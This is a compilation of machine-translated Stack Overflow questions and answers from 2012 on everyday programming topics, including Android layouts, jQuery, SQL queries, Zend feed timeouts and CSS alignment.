> 时间：2012-07-31T17:19:26.470

```
Stack      := List clone
Stack push := method(i, insertAt(i, 0))
Stack pop  := method(removeFirst)

Io> stack := Stack clone
==> list()
Io> stack push(1) push(2) push(3)
==> list(3, 2, 1)
Io> stack pop
==> 3
Io> stack pop
==> 2
Io> stack push(4)
==> list(3, 4)
Io> stack pop
==> 4
Io> stack pop
==> 1
Io> stack pop
==> nil 
```

和...

```
Queue         := List clone
Queue enqueue := method(i, insertAt(i, 0))
Queue dequeue := method(pop)

Io> queue := Queue clone
==> list()
Io> queue enqueue(1) enqueue(2) enqueue(3) enqueue(4)
==> list(4, 3, 2, 1)
Io> queue dequeue
==> 1
Io> queue dequeue
==> 2
Io> queue enqueue(5)
==> list(5, 4, 3)
Io> queue dequeue
==> 3
Io> queue dequeue
==> 4
Io> queue dequeue
==> 5
Io> queue dequeue
==> nil 
```

# iphone - ASIFormDataRequest Web 表单完成

> ID：11603750
> 
> 赞同：1
> 
> 时间：2012-07-22T20:26:22.013
> 
> 标签：iphone, post, asp-classic, asiformdatarequest

我正在尝试使用 ASIFormDataRequest 填写网络表单（我相信是 ASP）并将其从 iOS 提交到服务器。

我要填写的表格在这里：[http ://www.evolution-timecritical.com/shipment.asp](http://www.evolution-timecritical.com/shipment.asp)

表格示例如下：

```
<form name="shipment_form" method="POST" action="shipment.asp" onSubmit="return form_check();">
              <input type="hidden" name="action" value="send_enquiry">
                <table width="312"  border="0" cellpadding="0" cellspacing="4" id="Form table">
                  <tr align="left" valign="middle"> 
                    <td colspan="2"><span class="intro-highlight-text">CONTACT 
                      DETAILS </span></td>
                  </tr>
                  <tr align="left" valign="middle"> 
                    <td width="106">Company</td>
                    <td width="232"> <input name="company" type="text" class="textfield-height" id="Company" size="20" maxlength="50"> 
                    </td>
                  </tr>
                  <tr align="left" valign="top"> 
                    <td width="106">Company Address</td>
                    <td width="232"> <input name="address1" type="text" class="textfield-height" id="Address1" size="20" maxlength="80"> 
                      <input name="address2" type="text" class="textfield-height" id="Address2" size="20" maxlength="80"> 
                      <input name="address3" type="text" class="textfield-height" id="Address3" size="20" maxlength="80"></td>
                  </tr>
                  <tr align="left" valign="middle"> 
                    <td>Region/Province</td>
                    <td> <input name="region" type="text" class="textfield-height" id="Country" size="20" maxlength="30"></td>
                  </tr>
                  <tr align="left" valign="middle"> 
                    <td width="106">Postcode</td>
                    <td width="232"> <input name="postcode" type="text" class="textfield-height" id="Postcode" size="20" maxlength="30"></td>
                  </tr> 
```

我在 iOS 中使用以下代码尝试填写表格：

```
ASIFormDataRequest *request = [ASIFormDataRequest requestWithURL:url];

int totalDataCount = [completeData count];

for (int i = 0; i < totalDataCount; i++) {
    [request setPostValue:[completeData objectAtIndex:i] forKey:[completeKeys objectAtIndex:i]];
}

[request setDelegate:self];
[request startAsynchronous]; 
```

循环为表单中的每个键设置一个值，这些键存储在 NSArrays 中。

我从 ASIFormDataRequest 获得了一个成功的请求 Finished，来自服务器的状态码为 200。

但是，服务器响应字符串只是表单 (http://www.evolution-timecritical.com/shipment.asp) 的网页的 HTML。

谁能告诉我我做错了什么，或者我该如何解决这个问题。

谢谢

# android - 为什么 EditText 没有扩展到 fill_parent

> ID：11603751
> 
> 赞同：10
> 
> 时间：2012-07-22T20:26:39.333
> 
> 标签：android, android-edittext, fill-parent

我编写了一个 XML 代码，我希望在其中扩展 EditText 以适合父宽度。花了这么多时间后，我找不到扩展EditText的方法。

这是我的 XML：

```
<?xml version="1.0" encoding="UTF-8"?>

<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent">

    <TableLayout 
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent"
    android:orientation="vertical">

    <TableRow 
        android:layout_marginLeft="10dp" 
        android:layout_marginBottom="15dip">        
        <TextView
            android:text="Comment"
            android:layout_width="match_parent"
            android:textStyle="bold"
            android:padding="3dip" />      
    </TableRow>

    <TableRow 
        android:layout_marginLeft="10dp" 
        android:layout_marginBottom="15dip">        
       <EditText 
            android:id="@+id/EditText02"
            android:layout_height="wrap_content"
            android:lines="5" 
            android:gravity="top|left" 
            android:inputType="textMultiLine"
            android:scrollHorizontally="false" 
            android:minWidth="10.0dip"
            android:maxWidth="5.0dip"/>
    </TableRow>

    <TableRow 
        android:layout_marginLeft="10dp" 
        android:layout_marginBottom="15dip"
        android:gravity="center">           
       <Button 
            android:id="@+id/cancel"
            android:text="Next" />       
   </TableRow>
</TableLayout>
</LinearLayout> 
```

我在这里做错了什么。请帮我。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-01T15:34:27.067

有点老了，但我相信我有一些东西要补充。

我相信根据文档（引用如下），layout_width 和 layout_height 是为所有 TableRow 孩子预先确定的。

相反，layout_weight 可用于确定 TableRow 中元素的宽度/高度。也就是说，除非你想设置它的 android:ems 属性并根据它的字体大小给它一个宽度。

例如：

```
<TableRow
    android:id="@+id/tableRow1"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:gravity="center" >

    <EditText
        android:id="@+id/editText1"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:hint="@string/place"
        android:inputType="textPersonName" >

        <requestFocus />
    </EditText>

</TableRow> 
```

这为我在 TableRow 中生成了一个全屏宽的 EditText。

这是TableRow[文档中的一段话：](http://developer.android.com/reference/android/widget/TableRow.html)

> TableRow 的子项不需要在 XML 文件中指定 layout_width 和 layout_height 属性。TableRow 始终强制这些值分别为 MATCH_PARENT 和 WRAP_CONTENT。

正如我们所知，问题在于，实际上它并没有发生。我怀疑 layout_width 也会收到“WRAP_CONTENT”。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-11-25T10:37:32.597

请添加`android:stretchColumns="0"`到您的 TableLayout

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-22T21:11:35.320

在每一行中添加一个额外的 TextView 列。

此代码可能会对您有所帮助。

```
<?xml version="1.0" encoding="UTF-8"?>

<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent" 
android:layout_height="fill_parent">

<TableLayout 
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent"
    android:stretchColumns="1"
    android:orientation="vertical">

    <TableRow 
        android:layout_width="fill_parent"
        android:layout_marginLeft="10dp" 
        android:layout_marginBottom="15dip"> 

        <TextView android:text="" />    

        <TextView
            android:text="Comment"
            android:layout_width="match_parent"
            android:layout_marginRight="10dp"
            android:textStyle="bold"
            android:padding="3dip" />      
    </TableRow>

    <TableRow 
        android:layout_marginLeft="10dp" 
        android:layout_marginBottom="15dip"> 

        <TextView android:text="" />        

       <EditText 
            android:id="@+id/EditText02"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginRight="20dp"
            android:lines="5" 
            android:gravity="top|left" 
            android:inputType="textMultiLine"
            android:scrollHorizontally="false" />
    </TableRow>

    <TableRow 
        android:layout_marginLeft="10dp" 
        android:layout_marginBottom="15dip"
        android:gravity="center">

        <TextView android:text="" />        

       <Button 
            android:id="@+id/cancel"
            android:layout_marginRight="10dp"
            android:text="Next" />       
   </TableRow>
</TableLayout>
</LinearLayout> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-22T20:31:20.203

不确定是否严重。

您将 EditText 的最小宽度 ( `minWidth`) 设置为大于其最大宽度 ( `maxWidth`)，并且您没有给它一个`layout_width`属性（您应该将其设置为`match_parent`）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-22T20:58:08.670

`android:orientation`我认为您缺少`LinearLayout`

其次，如果这就是您所需要的，您可以避免使用 a`TableLayout`并且只使用一个`LinearLayout`with`android:orientation="vertical"`和其中的所有其他三个`View`s。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-05-22T07:30:35.073

你可以`layout_weight="1"`在edittextview中使用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-02-23T02:25:21.337

`<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:id="@+id/LinearLayout1" android:layout_width="fill_parent" android:layout_height="fill_parent" android:background="@drawable/back" android:orientation="vertical" android:paddingBottom="@dimen/activity_vertical_margin" android:paddingLeft="@dimen/activity_horizontal_margin" -->> change to 0dip android:paddingRight="@dimen/activity_horizontal_margin" -->> change to 0dip android:paddingTop="@dimen/activity_vertical_margin" tools:context=".StartUp" >`

# windows - 从 windows 命令提示符使命令可执行

> ID：11603752
> 
> 赞同：0
> 
> 时间：2012-07-22T20:26:39.710
> 
> 标签：windows, variables, environment

我被迫使用 Windows 2003 服务器机器，我需要能够运行 BitNami SVN 提交挂钩，它将更新同一台机器上的工作目录。由于不同的用户，我以管理员身份编写和测试的脚本在提交后不起作用。所以我试图让 SVN 成为任何 CMD 提示符下的可执行命令。

现在，我能做到的唯一方法是运行执行以下操作的批处理文件（这是默认的 BitNami 安装批处理文件）：

CALL C:\PROGRA~1\BITNAM~1\scripts\setenv.bat" 如果不存在 "%USERPROFILE%\BitNami Subversion Stack projects" mkdir "%USERPROFILE%\BitNami Subversion Stack projects" cd "%USERPROFILE%\BitNami Subversion堆叠项目

启动“BitNami Subversion 堆栈环境”cmd

\scripts\setenv.bat 文件包含以下内容：

设置 PATH=C:\Program Files\BitNami Subversion Stack/subversion\bin;C:\Program Files\BitNami Subversion Stack/sqlite;%PATH% rem ##### SUBVERSION ENV ##### rem #### # SQLITE ENV ##### rem ##### APACHE ENV #####

所以我编辑了我的电脑 --> 属性 --> 高级 --> 环境变量，添加了这两个条目： C:\Program Files\BitNami Subversion Stack/subversion\bin C:\Program Files\BitNami Subversion Stack/sqlite

但我仍然无法从普通命令提示符执行 SVN 命令。所以我有两个问题，1 - 我怎样才能让 SVN 在这种情况下从正常的命令提示符下工作，以及 2，谁能解释我所做的和批处理文件所做的区别？目前在我看来它们是相同的......虽然显然不是，因为只有一个有效......

感谢您的任何帮助，您可以提供！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:39:20.927

正如 Greg Hewgill 指出的那样，我未能更新我的 PATH 环境变量。这样做解决了我的问题——谢谢格雷格！

# jquery - Fancybox：显示组中的总图像数

> ID：11603753
> 
> 赞同：2
> 
> 时间：2012-07-22T20:26:51.200
> 
> 标签：jquery, fancybox

使用 Fancybox，当模式打开时，是否有任何地方可以显示组中的图像数量？例如“图像 1 of 4”、“图像 2 of 4”等？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-22T21:34:46.160

如果您使用的是 fancybox v1.3.4，请使用 API 选项`titleFormat`，例如：

```
$(document).ready(function(){
 $(".fancybox").fancybox({
  'titlePosition': 'over',
  'titleFormat': function(title, currentArray, currentIndex, currentOpts) {
     return '<span id="fancybox-title-over">Image ' + (currentIndex + 1) + ' of ' + currentArray.length + ' ' + title + '</span>';
   }
 }); // fancybox
}); // ready 
```

如果您使用的是 fancybox **v2.0.6+** ，请使用 API 选项`beforeShow`，例如：

```
$(document).ready(function(){
 $(".fancybox").fancybox({
   helpers : { 
    title : { type : 'over' }
   }, // helpers
   beforeShow : function() {
    this.title = (this.title ? '' + this.title + '' : '') + 'Image ' + (this.index + 1) + ' of ' + this.group.length;
   } // beforeShow
 }); // fancybox
}); // ready 
```

对于比 v2.0.6（仅限 v2.x）更旧的版本，请改用`afterLoad`。[查看此链接了解更多信息](https://stackoverflow.com/a/8663270/1055987)

# django - 如何在 django-tastypie 中为 resource_uri 补水？

> ID：11603754
> 
> 赞同：4
> 
> 时间：2012-07-22T20:26:53.643
> 
> 标签：django, tastypie

我只有一个 Resource uri，比如`'/api/v1/myobjectresource/23/'`，我需要为它补充水分。这意味着，我想从其实例化 MyObject(pk=23) `resource_uri`。我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-04T13:22:13.703

摘自[https://gist.github.com/794424](https://gist.github.com/794424)

> def get_resource_uri(self, bundle_or_obj):
> 
> ```
> kwargs = {
>     'resource_name': self._meta.resource_name,
> }
> if isinstance(bundle_or_obj, Bundle):
>     kwargs['pk'] = bundle_or_obj.obj.id # pk is referenced in ModelResource
> else:
>     kwargs['pk'] = bundle_or_obj.id
> if self._meta.api_name is not None:
>     kwargs['api_name'] = self._meta.api_name
> return self._build_reverse_url('api_dispatch_detail', kwargs = kwargs) 
> ```

# jquery - 在第一个图像元素 jquery 之后添加图像

> ID：11603758
> 
> 赞同：2
> 
> 时间：2012-07-22T20:27:34.493
> 
> 标签：jquery, image, insert, append, appendto

我正在尝试在 div 元素中动态添加图像。所以我有一个这样的块

```
<div id="gallery" >
    <img src="images/slide1.jpg" alt="Slide 1 />
    <img src="images/slide2.jpg" alt="Slide 2 />
    <img src="images/slide3.jpg" alt="Slide 3 />
    <img src="images/slide4.jpg" alt="Slide 4 />
</div> 
```

这个想法是在第一张图片之后动态插入图片，这样我的新图片就在第一张图片之后。我试过 appendTo、append、after、insertAfter。

你有什么想法 ？提前致谢 ：）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T20:30:43.467

> 你有一些格式错误的 HTML - 我会假设在复制代码时这是一个错误......

也许这会有所帮助-

```
$('<img src="foo.jpg" />').insertAfter("#gallery > img:first"); 
```

如果你想使用这个`insertAfter()`功能，你必须确保你选择了正确的元素。在这种情况下

*   第一个`img`标签 - `:first`
*   在儿童的第一阶段 `>`
*   在 id 的元素中`gallery`。-`$("#gallery")`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-23T06:59:02.613

有我的问题的答案，我通过使用这一行解决了它：

```
$image.insertBefore("#container > img:last"); 
```

我记得我在最后添加了我的图片，而不是容器元素的开头。

再次感谢。

# sql - 如何从任何 SQL 查询中列出列名

> ID：11603759
> 
> 赞同：1
> 
> 时间：2012-07-22T20:27:44.153
> 
> 标签：sql, sqlalchemy

使用 SQL Alchemy，我想知道是否可以从任何 SQL 查询中获取所有列的列表。

例如，如果我调用此查询：

```
SELECT * FROM users; 
```

我需要所有结果，还需要 table 中所有列的列表`users`。

我知道我可以点击表信息架构，但我的问题也会影响任何类型的查询，例如：

```
SELECT u.*, f.name, f.size FROM users u LEFT JOIN files f ON f.user_id = u.id; 
```

我从 SQL Alchemy 中看到了这个选项`[column_description][1]`，但我不知道它是否只适用于 ORM 样式；我使用的是非 ORM 样式（我将直接编写查询）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-23T07:51:24.297

使用[`ResultProxy.keys()`](http://docs.sqlalchemy.org/en/rel_0_7/core/connections.html#sqlalchemy.engine.base.ResultProxy.keys)：

```
sql = "SELECT * FROM users;"
res_proxy = session.execute(sql)
column_names = res_proxy.keys() 
```

*但是，我同意马克的观点，即不应将`SELECT *`其用作一般规则。*

# ruby - 将数组中的一个字符串元素转换为同一个数组中的多个元素

> ID：11603761
> 
> 赞同：0
> 
> 时间：2012-07-22T20:28:20.123
> 
> 标签：ruby, arrays, parsing, stripping

我有以下数组：

```
info = ["Thursday, July 19, 2012", 
        " \n    4:00 PM to 6:00 PM (CT) \n                  happy hour with company\n                  company100 W. Main St.Suite 5Chicago, IL 60602"] 
```

我正在尝试将 info[1] 从单个元素转换为 info 数组中的多个元素。例如，我想将 info[1] 分为三个元素（小时、事件名称/描述和地址）。知道如何开始这样做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T21:16:32.467

怎么样

```
parts = info[1].split("\n").map(&:strip).reject(&:empty?) 
```

如果你想把它放回去，你可以做类似的事情

```
info[1] = parts
info.flatten! 
```

# mysql - MySQL——分层选择

> ID：11603766
> 
> 赞同：0
> 
> 时间：2012-07-22T20:30:32.440
> 
> 标签：mysql

我有一个`table`针对我的国家的领土划分，如下所示：

*   0级：国家
*   1级：区
*   2级：县
*   3级：教区

（这些名字是在谷歌上翻译的）

此级别对应于`parent => child`如下的伪关系：

```
TABLE zones

id
parent_id
name 
```

样本数据：

```
VALUES (1,0,'LEVEL 1')
VALUES (2,1,'LEVEL 2')
VALUES (3,2,'LEVEL 3') 
```

到目前为止，一切都很好。现在我的问题是：如何`zones`从某个区域（1 级）中选择所有与之相关的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:45:39.723

这将以联合格式获取所有信息：

```
SELECT *
FROM zones l1
INNER JOIN zones l2 ON l2.parent_id = l1.id
INNER JOIN zones l3 ON l3.parent_id = l2.id
WHERE l1.id = <id> 
```

但是，如果您想简单地列出所有相关区域（不包括该地区本身，而仅包括该地区的县和教区），则需要使用`UNION`：

```
SELECT l2.*
FROM zones l1
INNER JOIN zones l2 ON l2.parent_id = l1.id
WHERE l1.id = <id>

UNION ALL

SELECT l3.*
FROM zones l1
INNER JOIN zones l2 ON l2.parent_id = l1.id
INNER JOIN zones l3 ON l3.parent_id = l2.id
WHERE l1.id = <id> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:49:21.440

鉴于层次结构的深度是固定的（只有 4 个级别），您可以相当轻松地编写 SQL。如果层次结构不固定，您将不得不更加努力地工作。

```
SELECT *
  FROM Zones
 WHERE name = 'LEVEL 1'
UNION
SELECT zc.*
  FROM Zones AS zd
  JOIN Zones AS zc ON zc.parent_id = zd.id
 WHERE zd.name = 'LEVEL 1'
UNION
SELECT zp.*
  FROM Zones AS zd
  JOIN Zones AS zc ON zc.parent_id = zd.id
  JOIN Zones AS zp ON zp.parent_id = zc.id
 WHERE zd.name = 'LEVEL 1'; 
```

# c++ - Eclipse CDT Eclipse CDT 使用 MinGW - exe 不会运行

> ID：11603768
> 
> 赞同：1
> 
> 时间：2012-07-22T20:30:41.103
> 
> 标签：c++, eclipse, mingw, eclipse-cdt

我在 Win7 上使用 CDT 和 MinGW 在 Eclipse Indigo 32bit 中编译了以下内容：

```
#include <iostream>
using namespace std;
int main()
{
  cout << "Hello World!" << endl;
  return 0;
} 
```

从这篇[文章](https://stackoverflow.com/questions/3443254/eclipse-cdt-using-mingw-does-not-output-in-console)我已经设置：

在 Window -> Preferences-> C/C++ -> Build -> Environment -> 添加一个变量，例如，我添加了：MINGW，值为“C:\MinGW\bin”

当我在 Debug 文件夹中选择 exe 并单击运行时，它会显示：

```
Launch failed: binary not found 
```

当我尝试从 Eclipse 外部运行它时，我得到：

```
Windows cannot access the specified device, path or file. You may not have appropriate permissions to access the item. 
```

甚至尝试以管理员身份运行。

当我尝试在命令行上编译时：

```
g++ -o hello.exe hello.cpp 
```

我得到：

```
c:/mingw/bin/../lib/gcc/mingw32/4.5.2/../../../libmingw32.a(main.o):main.c:(.tex
t+0xd2): undefined reference to `WinMain@16'
collect2: ld returned 1 exit status 
```

提前致谢。

# java - 如何设置SplitPane setOneTouchExpandable 只向一个方向展开

> ID：11603771
> 
> 赞同：2
> 
> 时间：2012-07-22T20:31:01.720
> 
> 标签：java

我在我的 JSplitPane 中设置了 setOneTouchExpandable(true) 和 setEnabled(false) ，只允许用户向左或向右扩展。但我真正想要的是让左侧面板要么折叠到左侧，要么保持在默认位置。（这就是我设置 setEnabled(false) 的原因）。

有没有一种简单的方法可以实现这一目标？欢迎任何帮助或代码片段！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T21:00:57.670

最简洁的答案是不”。

长答案是“是”，有很多工作最终可能无法满足您的长期需求。

我对代码进行了挖掘，发现“一键式”箭头是由`BasicSplitPaneDividerUI`（在大多数情况下）构造的。作为其职责的一部分，它创建了两个调整大小按钮。

您提供的任何属性都不允许您告诉此 UI 委托仅呈现单个箭头或以任何方式捕获发生的操作事件。

所以，这让你有两个选择。

1.  您可以创建自己的 UI 委托并实现所需的功能。这当然会冒着产生不再匹配剩余 UI 的 UI 的风险，并且您还必须考虑这将如何影响应用程序中的任何其他拆分窗格。
2.  使用一点蛮力。基本上，您想要遍历`JSplitPanes`容器的层次结构并找到任何 JButton。然后，您要么想将自己的动作侦听器附加到它们，要么完全替换它们。

# zend-framework - Zend_Feed_Reader 异常：10 秒后读取超时

> ID：11603774
> 
> 赞同：4
> 
> 时间：2012-07-22T20:31:28.960
> 
> 标签：zend-framework, rss-reader, atom-feed, zend-feed

我`Zend_Feed_Reader`用来阅读提要，但我有一个问题。在某些提要中，我得到了这个例外：`Read timed out after 10 seconds`我想减少那个时间。

因此，如果`Zend_Feed_Reader`无法在 4 秒内读取该提要，则会引发此异常。我不希望他尝试阅读 10 秒，如果他无法在 4 秒内阅读，请放弃。

这可能吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T22:54:16.530

像许多 ZF 组件一样，`Zend_Feed_Reader`用于`Zend_Http_Client`与外部服务进行通信，您可以为其提供此类的预配置实例以实现自定义功能（例如使用 HTTP 代理、自定义用户代理，或者在您的情况下，超时）：

```
$client = new Zend_Http_Client(null, array(
    'timeout' => 4
));
Zend_Feed_Reader::setHttpClient($client); 
```

然后像以前一样使用组件：

```
$feed = Zend_Feed_Reader::import('http://example.com/some-feed.rss'); 
```

# database - 基于日期的数据聚合

> ID：11603775
> 
> 赞同：1
> 
> 时间：2012-07-22T20:32:09.520
> 
> 标签：database, aggregate-functions, visual-foxpro

我有一张这样的表（ldate d，amt n(7)，rdate d）。字段是贷款日期、金额、发布日期。

在这里，一条记录被认为是未决的，它的发布日期为空。例如，

```
SELECT SUM(AMT) FROM TABLE WHERE RDATE = {} 
```

给出截至日期的净未决金额

在计算给定日期的待处理金额时，如果记录的发布日期为空或发布晚于给定日期，则该记录被视为待处理！因此，要计算 {2011-10-09} 的待处理金额，查询是：

```
SELECT SUM(AMT) FROM TABLE WHERE LDATE <= {2011-10-09} AND (RDATE > {2011-10-09} OR RDATE = {}) 
```

现在，我将如何从上表中逐年计算待处理金额？我期望的结果是这样的：

```
Year    PendingAmt 
2009    1,15,000 
2010    1,38,000 
2011    1,71,000 
```

注意：实际表中还有许多其他字段。为简洁起见，我在这里只提到了重要的字段。RDBMS 使用 Microsoft Visual Foxpro 9.0

**更新：**添加了示例数据

```
CREATE TABLE VB(LDATE DATE, AMT NUMERIC(7), RDATE DATE);

INSERT INTO VB VALUES('2010-01-05', 12000, NULL);
INSERT INTO VB VALUES('2010-03-15', 25000, '2010-04-19');
INSERT INTO VB VALUES('2010-05-21', 31000, NULL);
INSERT INTO VB VALUES('2010-07-03', 58000, '2010-07-11');
INSERT INTO VB VALUES('2010-09-10', 47000, NULL);
INSERT INTO VB VALUES('2010-11-30', 63000, '2011-01-09');

INSERT INTO VB VALUES('2011-02-15', 21000, NULL);
INSERT INTO VB VALUES('2011-04-05', 52000, '2011-04-11');
INSERT INTO VB VALUES('2011-06-03', 13000, NULL);
INSERT INTO VB VALUES('2011-08-21', 85000, '2011-09-19');
INSERT INTO VB VALUES('2011-10-30', 74000, '2012-02-10');
INSERT INTO VB VALUES('2011-12-10', 36000, '2012-03-29');

INSERT INTO VB VALUES('2012-01-05', 15000, NULL);
INSERT INTO VB VALUES('2012-02-15', 25000, NULL);
INSERT INTO VB VALUES('2012-03-15', 35000, NULL);
INSERT INTO VB VALUES('2012-10-30', 30000, '2012-11-21');
INSERT INTO VB VALUES('2012-11-30', 31000, '2012-12-31');
INSERT INTO VB VALUES('2012-12-10', 12000, NULL); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T20:46:24.780

更新：根据您现在提供的数据，以及其中包含的其他信息（例如未付贷款的 rDate 不为空，而是为空，这是改进的查询：

SELECT YEAR(ldate) yr, SUM(amt) pamt ; 来自 vb ; WHERE (rdate > DATE(YEAR(ldate),12,31) OR ISNULL(rdate)) ; 按年分组；INTO CURSOR 结果

我得到的结果是：

2010 153000 2011 14400 2012 87000

根据我对您的问题的理解，这是正确的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-23T01:06:17.420

最简单的做法是联合：

```
SELECT 2009 as yr, SUM(AMT) as amount
FROM TABLE
WHERE LDATE <= {2009-12-31} AND (RDATE > {2009-12-31} OR RDATE = {})
union all
SELECT 2010 as yr, SUM(AMT) as amount
FROM TABLE
WHERE LDATE <= {2010-12-31} AND (RDATE > {2010-12-31} OR RDATE = {})
union all
SELECT 2011 as yr, SUM(AMT) as amount
FROM TABLE
WHERE LDATE <= {2011-12-31} AND (RDATE > {2011-12-31} OR RDATE = {}) 
```

# android - ListView 适配器与来自 xml 的字典

> ID：11603776
> 
> 赞同：0
> 
> 时间：2012-07-22T20:32:24.140
> 
> 标签：android

我想将适配器设置为 ListView，其中 ListView 的项目是字典。出于本地化目的，我希望这些项目在“值”文件夹下的 xml 中定义。

目前，我使用带有字符串的简单列表，其中数组在 \values\arrays.xml 中定义

但我不想使用列表中所选项目的索引 - 如果我有时更改项目的顺序，我必须更改依赖于此隐式索引的所有代码。使用定义的密钥会容易得多。

我怎么能这样做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:59:58.440

我不会使用字典。它[已经过时了](http://developer.android.com/reference/java/util/Dictionary.html)。我认为您最好使用`ArrayList`of custom`Object`或 a `HashMap`。然后你可以`Object`从你的`Adapter`：

```
listview.setOnItemClickListener(new OnItemClickListener() {
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {

              //adapter.getItem(position); - this is how you can acces the object
              //connected to the selected item from the list
              //Then you can easily access an id of this object (or from HashMap)

            }
}); 
```

编辑：如果您想在 xml 中有一个列表，您可以随时将一个抽象 xml 文件添加到您的资源中。这些也可以本地化。它会是这样的：

```
<my_word>
    <id>123</id>
    <word>My word</word>
</my_word> 
```

但它会涉及 XML 解析，所以它不一定是更容易的解决方案。

# jquery - 以块的形式呈现 JSON 对象？

> ID：11603777
> 
> 赞同：1
> 
> 时间：2012-07-22T20:32:34.460
> 
> 标签：jquery, json, render

我从数据库中提取数百行并创建一个 JSON 对象，然后通过 jQuery 呈现。但我目前正在渲染所有减慢页面加载速度的数据对象。动态渲染 JSON 块的最佳方法是什么？此外，当用户滚动浏览呈现的显示时附加和删除呈现的块是否有意义？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:57:25.570

通常，当您创建和添加大量 DOM 节点时，您应该使用**文档片段**( [`document.createDocumentFragment`](https://developer.mozilla.org/en/DOM/document.createDocumentFragment))。 如果您要避免对每个数据元素进行重排，而是将其中的 20 个捆绑在一个片段中，并通过一次操作将其插入到主 DOM 中，那么您的代码可能会因此获得[显着的性能提升。](https://developers.google.com/speed/articles/javascript-dom)

在不了解细节的情况下，**“延迟插入”**数据似乎是个好主意。您应该解析 JSON 对象并将其保存在数组中，然后监视滚动位置（[使用计时器以避免事件过度杀伤](http://ejohn.org/blog/learning-from-twitter/)）并在必要时从数组中插入更多元素。我想我会尽量不删除它们，但保留你（昂贵地）插入的内容。

除此之外，请提供更多细节：如何渲染和插入元素，它们的标记有多复杂？

# css - 对齐 div 中的元素 - 奇怪的行为

> ID：11603783
> 
> 赞同：0
> 
> 时间：2012-07-22T20:33:16.317
> 
> 标签：css, html, alignment

我正在尝试在 div 元素中对齐 div 和图像，以使它们水平居中。在我指定 img 元素的 src 属性之前，这似乎可以正常工作 - 为其分配图像；此时它看起来像这样：

![问题图片](../Images/4011dc98452d27cfe435c0ccff6933de.png)

源代码如下（HTML）：

```
<div id="sContainer">
    <input id="sBox" type="text" />
    <img id="sButton" alt="Search" src="images/searchglass.jpg" />
</div> 
```

和（CSS）：

```
#sContainer
{
background-color:yellow;
float:left;
text-align:center;
width:560px;
} 
```

对于那些对图像在 src 属性中没有值并因此显示 alt 文本时的外观感兴趣的人，它看起来像这样：

![问题图片](../Images/bfe9991e75449b4045d1539d4d830d4e.png)

有人知道如何解决这个恼人的问题吗？

**编辑：**

更多 HTML 代码：

```
<div class="center" id="header">

    <div id="leftContainer"></div>

    <div id="sContainer">
        <input id="sBox" type="text" />
        <img id="sButton" alt="Search" src="images/searchglass.jpg" />
    </div>

    <div id="rightContainer"></div>

</div> 
```

和 CSS：

```
.center
{
clear:both;
margin-left:auto;
margin-right:auto;
width:960px;
}

#header
{
background-color:gray;
height:50px;
}

#rightContainer
{
background-color:red;
float:left;
width:200px;
}

#leftContainer
{
background-color:green;
float:left;
width:200px;
}

#sBox
{
border-bottom-color:black;
border-bottom-style:solid;
border-bottom-width:1px;
border-left-color:black;
border-left-style:solid;
border-left-width:1px;
border-top-color:black;
border-top-style:solid;
border-top-width:1px;
height:18px;
padding:5px;
width:348px;
}

#sContainer
{
background-color:yellow;
float:left;
text-align:center;
width:560px;
}

#searchContainer > *
{
vertical-align:middle;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:49:10.367

当图像具有有效`src`属性时，它会获得尺寸，因此会强制其父元素的高度。如果要将文本框和图像保留为内联元素，可以将父级的 line-height 调整为图像高度：

```
#sContainer
{
    background-color:yellow;
    float:left; // btw, does this need to be floated?
    text-align:center;
    width:560px;
    line-height: 30px;
} 
```

但是，这不会在所有浏览器中一致地呈现，因为默认情况下，这些元素与基线垂直对齐。您希望将 的所有子元素垂直对齐`#sContainer`到顶部或中间。

```
#sContainer > *
{
    vertical-align: middle;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:50:27.940

[http://jsfiddle.net/QUk5m/](http://jsfiddle.net/QUk5m/)

我的建议：

1.  将搜索栏和搜索按钮放在一个 中，在本例中`div`调用`inside-container`
2.  将搜索栏浮动到左侧，将搜索按钮浮动到右侧
3.  给外部容器，或者`#sContainer`，一个高度，因为里面有浮动元素
4.  给每个元素一个高度和宽度！

显然，对我的 jsFiddle 进行更改，使其更适合您的高度/宽度和命名结构。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:38:03.193

尝试给您`img`的`vertical-align`css 样式，例如：

```
#sContainer img
{
    vertical-align: -4px;
} 
```

# c++ - 选择最大“n”值

